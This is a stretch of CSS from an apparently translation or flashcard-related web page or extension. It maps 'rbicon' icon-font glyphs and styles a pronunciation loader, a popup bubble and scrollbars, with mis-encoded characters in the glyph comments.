/* 'î ' */
.icon-keyboard-2:before {
  content: '\E80E'; }

/* 'î Ž' */
.icon-ok-circled:before {
  content: '\E814'; }

/* 'î ”' */
.icon-cancel-circled:before {
  content: '\E817'; }

/* 'î —' */
.icon-translate:before {
  content: '\E822'; }

/* 'î ¢' */
.icon-anki:before {
  content: '\E823'; }

/* 'î £' */
.icon-anki-1:before {
  content: '\E825'; }

/* 'î ¥' */
.icon-acc-basic:before {
  content: '\E830'; }

/* 'î °' */
.icon-acc-subscriber:before {
  content: '\E831'; }

/* 'î ±' */
.icon-rb-ico:before {
  content: '\E834'; }

/* 'î ´' */
.icon-cog:before {
  content: '\E840'; }

/* 'î¡€' */
.icon-login:before {
  content: '\E845'; }

/* 'î¡…' */
.icon-logout:before {
  content: '\E846'; }

/* 'î¡†' */
.icon-arrow-down-bold:before {
  content: '\E859'; }

/* 'î¡™' */
.icon-scissors:before {
  content: '\E88A'; }

/* 'î¢Š' */
.icon-home:before {
  content: '\E8C2'; }

/* 'î£‚' */
.icon-mute:before {
  content: '\E900'; }

/* 'î¤€' */
.icon-sound:before {
  content: '\E901'; }

/* 'î¤' */
.icon-left-bold:before {
  content: '\E929'; }

/* 'î¤©' */
.icon-down:before {
  content: '\E92C'; }

/* 'î¤¬' */
.icon-up:before {
  content: '\E92F'; }

/* 'î¤¯' */
.icon-switch:before {
  content: '\E937'; }

/* 'î¤·' */
.icon-graduation-cap-1:before {
  content: '\E96A'; }

/* 'î¥ª' */
.icon-floppy:before {
  content: '\E971'; }

/* 'î¥±' */
.icon-facebook:before {
  content: '\E98E'; }

/* 'î¦Ž' */
.icon-webstore:before {
  content: '\EC24'; }

/* 'î°¤' */
.icon-vk:before {
  content: '\EC71'; }

/* 'î±±' */
.icon-mail:before {
  content: '\ECD3'; }

/* 'î³“' */
.icon-graduation-cap:before {
  content: '\EE02'; }

/* 'î¸‚' */
.icon-emo-happy:before {
  content: '\EE63'; }

/* 'î¹£' */
.icon-emo-unhappy:before {
  content: '\EE66'; }

/* 'î¹¦' */
.icon-spin1:before {
  content: '\EE77'; }

/* 'î¹·' */
.icon-bookmark-empty:before {
  content: '\F097'; }

/* 'ï‚—' */
.icon-filter:before {
  content: '\F0B0'; }

/* 'ï‚°' */
.icon-paste:before {
  content: '\F0EA'; }

/* 'ïƒª' */
.icon-angle-double-left:before {
  content: '\F100'; }

/* 'ï„€' */
.icon-angle-double-right:before {
  content: '\F101'; }

/* 'ï„' */
.icon-angle-left:before {
  content: '\F104'; }

/* 'ï„„' */
.icon-angle-right:before {
  content: '\F105'; }

/* 'ï„…' */
.icon-angle-down:before {
  content: '\F107'; }

/* 'ï„‡' */
.icon-minus-squared:before {
  content: '\F147'; }

/* 'ï…‡' */
.icon-export-alt:before {
  content: '\F14D'; }

/* 'ï…' */
.icon-expand-right:before {
  content: '\F152'; }

/* 'ï…’' */
.icon-plus-squared:before {
  content: '\F196'; }

/* 'ï†–' */
.icon-language:before {
  content: '\F1AB'; }

/* 'ï†«' */
.icon-sliders:before {
  content: '\F1DE'; }

/* 'ï‡ž' */
.icon-trash:before {
  content: '\F1F8'; }

/* 'ï‡¸' */
.icon-clone:before {
  content: '\F24D'; }

/* 'ï‰' */
.icon-question-circle-o:before {
  content: '\F29C'; }

/* 'ïŠœ' */
.icon-user-circle:before {
  content: '\F2BD'; }

/* 'ïŠ½' */
.icon-twitter:before {
  content: '\F309'; }

/* 'ïŒ‰' */
.icon-gplus:before {
  content: '\F30F'; }

/* 'ïŒ' */
.icon-linkedin:before {
  content: '\F318'; }

/* 'ïŒ˜' */
[class^="icon-"]:before,
[class*=" icon-"]:before {
  display: inline-block;
  width: 1em;
  margin-right: .2em;
  margin-left: .2em;
  /* For safety - reset parent styles, that can break glyph codes*/
  font-family: "rbicon";
  font-variant: normal;
  font-weight: normal;
  font-style: normal;
  text-transform: none;
  text-align: center;
  text-decoration: inherit;
  -webkit-font-smoothing: antialiased;
  speak: none; }

/* stylelint-enable */
</style><style type="text/css">.Pronouncer__loading__2zqT4,
.Pronouncer__loading__2zqT4 > i {
  cursor: wait; }
</style><style type="text/css">@keyframes Bubble__zoom-in-out__1nY8w {
  0% {
    transform: translateX(-50%) scale(0.9); }
  50% {
    transform: translateX(-50%) scale(1.1); }
  100% {
    transform: translateX(-50%) scale(1); } }

.Bubble__bubble__2jKwp {
  position: absolute;
  z-index: 1009;
  transform: translateX(-50%);
  width: 28px;
  height: 28px;
  border-radius: 4px;
  box-shadow: 0 0 8px rgba(1, 22, 39, 0.3);
  background-color: #2EC4B6;
  animation: Bubble__zoom-in-out__1nY8w 200ms ease-out;
  transition: box-shadow 150ms ease-out; }
  .Bubble__bubble__2jKwp > i {
    display: inline-block;
    width: 100%;
    height: 100%;
    color: #FDFFFC;
    font-size: 18px;
    line-height: 28px;
    text-align: center;
    text-shadow: 0 1px #20897f; }
    .Bubble__bubble__2jKwp > i:before {
      margin: 0; }
  .Bubble__bubble__2jKwp:active > i {
    text-shadow: 0 -1px #20897f; }
</style><style type="text/css">::-webkit-scrollbar {
  width: 8px; }

::-webkit-scrollbar-thumb {
  border-radius: 8px;
  background-color: rgba(0, 0, 0, 0.45); }

main {
  all: initial;
  font-size: 16px;
  font-family: Georgia, Trebuchet MS, Helvetica, Helvetica Neue;
  -webkit-font-smoothing: antialiased; }

* {
  box-sizing: border-box; }

input,
button,
select {
  outline: none;
  font-family: Georgia, Trebuchet MS, Helvetica, Helvetica Neue;
  -webkit-font-smoothing: antialiased; }
</style></template></div></body></html>